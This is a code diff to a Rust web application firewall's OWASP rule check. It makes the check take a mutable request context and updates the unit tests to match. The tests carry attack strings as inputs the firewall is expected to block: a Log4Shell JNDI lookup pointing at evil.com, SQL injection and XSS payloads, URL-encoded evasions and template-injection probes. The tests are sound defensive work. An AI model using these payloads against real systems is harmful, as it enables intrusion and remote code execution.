@@ -254,7 +254,7 @@ impl Default for OWASPCheck {
 }
 
 impl Check for OWASPCheck {
-    fn check(&self, ctx: &RequestCtx) -> Option<DetectionResult> {
+    fn check(&self, ctx: &mut RequestCtx) -> Option<DetectionResult> {
         if !ctx.host_config.defense_config.owasp_set {
             return None;
         }
@@ -588,6 +588,7 @@ mod tests {
             tier_policy: waf_common::RequestCtx::default_tier_policy(),
             cookies: std::collections::HashMap::new(),
             device_fp: None,
+            tx_velocity_token: None,
         }
     }
 
@@ -621,23 +622,24 @@ mod tests {
             tier_policy: waf_common::RequestCtx::default_tier_policy(),
             cookies: std::collections::HashMap::new(),
             device_fp: None,
+            tx_velocity_token: None,
         }
     }
 
     #[test]
     fn test_invalid_method_blocked() {
         let checker = OWASPCheck::new();
-        let ctx = make_ctx("FOOBAR", "/", 0);
-        assert!(checker.check(&ctx).is_some(), "FOOBAR method should be blocked");
+        let mut ctx = make_ctx("FOOBAR", "/", 0);
+        assert!(checker.check(&mut ctx).is_some(), "FOOBAR method should be blocked");
     }
 
     #[test]
     fn test_valid_method_allowed() {
         let checker = OWASPCheck::new();
         for method in &["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"] {
-            let ctx = make_ctx(method, "/", 0);
+            let mut ctx = make_ctx(method, "/", 0);
             assert!(
-                checker.check(&ctx).is_none(),
+                checker.check(&mut ctx).is_none(),
                 "{method} should be allowed by OWASP method check"
             );
         }
@@ -646,8 +648,8 @@ mod tests {
     #[test]
     fn test_large_body_blocked() {
         let checker = OWASPCheck::new();
-        let ctx = make_ctx("POST", "/upload", 11 * 1024 * 1024); // 11 MB
-        assert!(checker.check(&ctx).is_some(), "11MB body should be blocked");
+        let mut ctx = make_ctx("POST", "/upload", 11 * 1024 * 1024); // 11 MB
+        assert!(checker.check(&mut ctx).is_some(), "11MB body should be blocked");
     }
 
     #[test]
@@ -655,7 +657,7 @@ mod tests {
         let checker = OWASPCheck::new();
         let mut ctx = make_ctx("GET", "/", 0);
         ctx.path = "${jndi:ldap://evil.com/a}".into();
-        assert!(checker.check(&ctx).is_some());
+        assert!(checker.check(&mut ctx).is_some());
     }
 
     // ── detect_sqli tests ────────────────────────────────────────────────────
@@ -678,23 +680,26 @@ rules:
     fn detect_sqli_blocks_or_tautology() {
         let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
         assert_eq!(checker.rule_count(), 1);
-        let ctx = make_ctx_with_query("id=1' OR '1'='1");
-        let result = checker.check(&ctx);
+        let mut ctx = make_ctx_with_query("id=1' OR '1'='1");
+        let result = checker.check(&mut ctx);
         assert!(result.is_some(), "Should detect SQL injection tautology");
     }
 
     #[test]
     fn detect_sqli_blocks_union_select() {
         let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
-        let ctx = make_ctx_with_query("id=1 UNION SELECT 1,2,3--");
-        assert!(checker.check(&ctx).is_some(), "Should detect UNION SELECT injection");
+        let mut ctx = make_ctx_with_query("id=1 UNION SELECT 1,2,3--");
+        assert!(
+            checker.check(&mut ctx).is_some(),
+            "Should detect UNION SELECT injection"
+        );
     }
 
     #[test]
     fn detect_sqli_allows_clean_input() {
         let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
-        let ctx = make_ctx_with_query("name=alice&page=2");
-        assert!(checker.check(&ctx).is_none(), "Should allow clean query string");
+        let mut ctx = make_ctx_with_query("name=alice&page=2");
+        assert!(checker.check(&mut ctx).is_none(), "Should allow clean query string");
     }
 
     #[test]
@@ -702,7 +707,7 @@ rules:
         let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
         let mut ctx = make_ctx("POST", "/login", 0);
         ctx.body_preview = Bytes::from("username=admin&password=1' OR '1'='1");
-        assert!(checker.check(&ctx).is_some(), "Should detect SQLi in body");
+        assert!(checker.check(&mut ctx).is_some(), "Should detect SQLi in body");
     }
 
     #[test]
@@ -710,7 +715,7 @@ rules:
         let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
         let mut ctx = make_ctx("GET", "/", 0);
         ctx.headers.insert("referer".into(), "http://x/' OR '1'='1".into());
-        assert!(checker.check(&ctx).is_some(), "Should detect SQLi in headers");
+        assert!(checker.check(&mut ctx).is_some(), "Should detect SQLi in headers");
     }
 
     // ── detect_xss tests ─────────────────────────────────────────────────────
@@ -733,22 +738,22 @@ rules:
     fn detect_xss_blocks_script_tag() {
         let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
         assert_eq!(checker.rule_count(), 1);
-        let ctx = make_ctx_with_query("q=<script>alert(1)</script>");
-        assert!(checker.check(&ctx).is_some(), "Should detect script tag XSS");
+        let mut ctx = make_ctx_with_query("q=<script>alert(1)</script>");
+        assert!(checker.check(&mut ctx).is_some(), "Should detect script tag XSS");
     }
 
     #[test]
     fn detect_xss_blocks_event_handler() {
         let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
-        let ctx = make_ctx_with_query("q=<img src=x onerror=alert(1)>");
-        assert!(checker.check(&ctx).is_some(), "Should detect event handler XSS");
+        let mut ctx = make_ctx_with_query("q=<img src=x onerror=alert(1)>");
+        assert!(checker.check(&mut ctx).is_some(), "Should detect event handler XSS");
     }
 
     #[test]
     fn detect_xss_allows_clean_input() {
         let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
-        let ctx = make_ctx_with_query("q=hello+world&page=1");
-        assert!(checker.check(&ctx).is_none(), "Should allow clean input");
+        let mut ctx = make_ctx_with_query("q=hello+world&page=1");
+        assert!(checker.check(&mut ctx).is_none(), "Should allow clean input");
     }
 
     #[test]
@@ -756,7 +761,7 @@ rules:
         let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
         let mut ctx = make_ctx("POST", "/comment", 0);
         ctx.body_preview = Bytes::from("text=<script>alert('xss')</script>");
-        assert!(checker.check(&ctx).is_some(), "Should detect XSS in body");
+        assert!(checker.check(&mut ctx).is_some(), "Should detect XSS in body");
     }
 
     // ── compile_rule operator alias tests ────────────────────────────────────
@@ -818,12 +823,15 @@ rules:
 "#;
         let checker = OWASPCheck::from_yaml(yaml);
         // Should detect in query
-        let ctx = make_ctx_with_query("id=1' OR '1'='1");
-        assert!(checker.check(&ctx).is_some(), "Should detect SQLi in query field");
+        let mut ctx = make_ctx_with_query("id=1' OR '1'='1");
+        assert!(checker.check(&mut ctx).is_some(), "Should detect SQLi in query field");
         // Should NOT detect in path when field is query-only
         let mut ctx2 = make_ctx("GET", "/1' OR '1'='1", 0);
         ctx2.query = String::new();
-        assert!(checker.check(&ctx2).is_none(), "Should not check path when field=query");
+        assert!(
+            checker.check(&mut ctx2).is_none(),
+            "Should not check path when field=query"
+        );
     }
 
     // ── URL-encoded evasion tests ────────────────────────────────────────────
@@ -832,9 +840,9 @@ rules:
     fn detect_sqli_url_encoded_evasion() {
         let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
         // %27 = single quote, %20 = space, %3D = equals
-        let ctx = make_ctx_with_query("id=1%27%20OR%20%271%27%3D%271");
+        let mut ctx = make_ctx_with_query("id=1%27%20OR%20%271%27%3D%271");
         assert!(
-            checker.check(&ctx).is_some(),
+            checker.check(&mut ctx).is_some(),
             "Should detect URL-encoded SQLi after decoding"
         );
     }
@@ -843,9 +851,9 @@ rules:
     fn detect_xss_url_encoded_evasion() {
         let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
         // %3Cscript%3E = <script>
-        let ctx = make_ctx_with_query("q=%3Cscript%3Ealert(1)%3C/script%3E");
+        let mut ctx = make_ctx_with_query("q=%3Cscript%3Ealert(1)%3C/script%3E");
         assert!(
-            checker.check(&ctx).is_some(),
+            checker.check(&mut ctx).is_some(),
             "Should detect URL-encoded XSS after decoding"
         );
     }
@@ -855,15 +863,15 @@ rules:
     #[test]
     fn detect_sqli_empty_input_safe() {
         let checker = OWASPCheck::from_yaml(SQLI_RULE_YAML);
-        let ctx = make_ctx("GET", "/", 0);
-        assert!(checker.check(&ctx).is_none(), "Empty input should not trigger SQLi");
+        let mut ctx = make_ctx("GET", "/", 0);
+        assert!(checker.check(&mut ctx).is_none(), "Empty input should not trigger SQLi");
     }
 
     #[test]
     fn detect_xss_empty_input_safe() {
         let checker = OWASPCheck::from_yaml(XSS_RULE_YAML);
-        let ctx = make_ctx("GET", "/", 0);
-        assert!(checker.check(&ctx).is_none(), "Empty input should not trigger XSS");
+        let mut ctx = make_ctx("GET", "/", 0);
+        assert!(checker.check(&mut ctx).is_none(), "Empty input should not trigger XSS");
     }
 
     #[test]
@@ -872,7 +880,7 @@ rules:
         let mut ctx = make_ctx("POST", "/", 0);
         ctx.body_preview = Bytes::from(vec![0xFF, 0xFE, 0x00, 0x80]);
         assert!(
-            checker.check(&ctx).is_none(),
+            checker.check(&mut ctx).is_none(),
             "Random binary data should not trigger SQLi"
         );
     }
@@ -895,16 +903,19 @@ paranoia: 1
         // Body check
         let mut ctx = make_ctx("POST", "/api/feedback", 0);
         ctx.body_preview = bytes::Bytes::from("{\"comment\":\"{{7*7}}\"}");
-        assert!(checker.check(&ctx).is_some(), "SSTI {{7*7}} in body should block");
+        assert!(checker.check(&mut ctx).is_some(), "SSTI {{7*7}} in body should block");
 
         let mut ctx2 = make_ctx("POST", "/api/feedback", 0);
         ctx2.body_preview = bytes::Bytes::from("{\"comment\":\"${7*7}\"}");
-        assert!(checker.check(&ctx2).is_some(), "SSTI dollar-brace in body should block");
+        assert!(
+            checker.check(&mut ctx2).is_some(),
+            "SSTI dollar-brace in body should block"
+        );
 
         // Query check
-        let ctx3 = make_ctx_with_query("name=%24%7B7*7%7D");
+        let mut ctx3 = make_ctx_with_query("name=%24%7B7*7%7D");
         assert!(
-            checker.check(&ctx3).is_some(),
+            checker.check(&mut ctx3).is_some(),
             "SSTI dollar-brace in query should block"
         );
     }
@@ -927,9 +938,9 @@ rules:
         let checker = OWASPCheck::from_yaml(yaml);
         assert_eq!(checker.rule_count(), 1);
         // Default paranoia is 1, so PL3 rule should be skipped
-        let ctx = make_ctx_with_query("id=1' OR '1'='1");
+        let mut ctx = make_ctx_with_query("id=1' OR '1'='1");
         assert!(
-            checker.check(&ctx).is_none(),
+            checker.check(&mut ctx).is_none(),
             "PL3 rule should be skipped at default paranoia level 1"
         );
     }
@@ -963,16 +974,19 @@ paranoia: 1
         let checker = OWASPCheck::from_yaml(CRS_920350_YAML);
         let mut ctx = make_ctx_with_host_and_xff("13.214.252.169", "5.5.5.5");
         ctx.host = "13.214.252.169".into();
-        assert!(checker.check(&ctx).is_some(), "numeric IP in Host header must block");
+        assert!(
+            checker.check(&mut ctx).is_some(),
+            "numeric IP in Host header must block"
+        );
     }
 
     #[test]
     fn crs_920350_allows_hostname_even_with_ip_in_xff() {
         let checker = OWASPCheck::from_yaml(CRS_920350_YAML);
         // Host is a proper domain; X-Forwarded-For contains a numeric IP — must NOT block
-        let ctx = make_ctx_with_host_and_xff("futureandgo.waf-exams.info", "166.88.120.155");
+        let mut ctx = make_ctx_with_host_and_xff("futureandgo.waf-exams.info", "166.88.120.155");
         assert!(
-            checker.check(&ctx).is_none(),
+            checker.check(&mut ctx).is_none(),
             "legitimate hostname with IP in X-Forwarded-For must not block (false-positive regression)"
         );
     }
@@ -980,7 +994,7 @@ paranoia: 1
     #[test]
     fn crs_920350_allows_hostname_no_xff() {
         let checker = OWASPCheck::from_yaml(CRS_920350_YAML);
-        let ctx = make_ctx_with_host_and_xff("example.com", "");
-        assert!(checker.check(&ctx).is_none(), "example.com must not block");
+        let mut ctx = make_ctx_with_host_and_xff("example.com", "");
+        assert!(checker.check(&mut ctx).is_none(), "example.com must not block");
     }
 }
